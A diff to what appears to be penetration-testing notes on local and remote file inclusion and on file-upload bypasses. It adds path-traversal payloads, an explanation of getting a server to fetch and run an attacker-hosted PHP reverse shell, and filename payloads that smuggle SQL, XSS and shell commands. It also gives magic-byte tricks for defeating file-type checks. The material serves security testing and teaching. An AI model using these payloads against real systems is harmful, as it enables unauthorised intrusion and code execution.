@@ -4,7 +4,9 @@
 
 local file inclusion happens when it is possible to access files stored on the target's system by passing a relative path to a parameter of a request. The number of "up one level instructions" is irrelevant because once we reach the root level, the additional "go up" instructions will be ignored.
 
-See LFI List for a list of possible target files for tests
+See [LFI List](file-upload/lfi-list.md) for a list of possible target files for tests
+
+#### Payloads
 
 ```
 #Linux
@@ -14,7 +16,29 @@ See LFI List for a list of possible target files for tests
 ..\..\..\..\..\..\..\..\..\..\..\..\boot.ini
 ```
 
+## RFI
+
+Remote file inclusion happens when an attacker is able to make a web server include and execute files hosted on a different server controlled by the attacker. For instance by making a parameter point to an url of a file such as a reverse shell written in php it is possible to make the server follow the url and execute the shell
+
+See PHP shells for shells to be used in an attack. Keep in mind that these files MUST be stored as .txt files instead of their executable format (.php, .jsp, .asp). If you don't do thisthe malicious code will be executed on your local server instead of the remote one
+
+#### Payloads
+
+```
+www.google.com    #expect to see html code as result
+<your url>:<port> #start a listener on the port and see if you receive an HTTP request
+```
+
 ## File upload functionality
+
+### Filename payloads
+
+```
+../../../tmp/evil.png                 #test for LFI
+sleep(10)-- -.jpg                     #test for SQLi
+<svg onload=alert(document.domain)>   #test for stored XSS
+; sleep 10;                           #test for RCE
+```
 
 ### Evade file restrictions
 
@@ -47,7 +71,7 @@ file.php%00.png%00.jpg
 
 ### Magic bytes
 
-To bypass file control insert the following bytes sequences at the beginning of the file to change its type and edit file extension accordingly.
+To bypass file controls based on MIME type and file signature insert the following bytes sequences at the beginning of the file to change its type and edit file extension accordingly. Once the file is stored on the server you will have to find a way to edit it back in order to restore its origina behavior when opened
 
 ```php
 python -c "print '<signature>'" > <file>
@@ -69,15 +93,6 @@ python -c "print '<signature>'" > <file>
 | BMP Image&#xD;                  | "BM"&#xD;           | 0x42 0x4D&#xD;                               |
 | GIF Image&#xD;                  | "GIF87a"&#xD;       | 0x47 0x49 0x46 0x38 0x37 0x61&#xD;           |
 | GIF Image&#xD;                  | "GIF89a"&#xD;       | 0x47 0x49 0x46 0x38 0x39 0x61                |
-
-## Malicious filenames
-
-```
-../../../tmp/lol.png 
-sleep(10)-- -.jpg 
-<svg onload=alert(document.comain)> 
-; sleep 10;
-```
 
 ## ImageTrick vulnerability
 
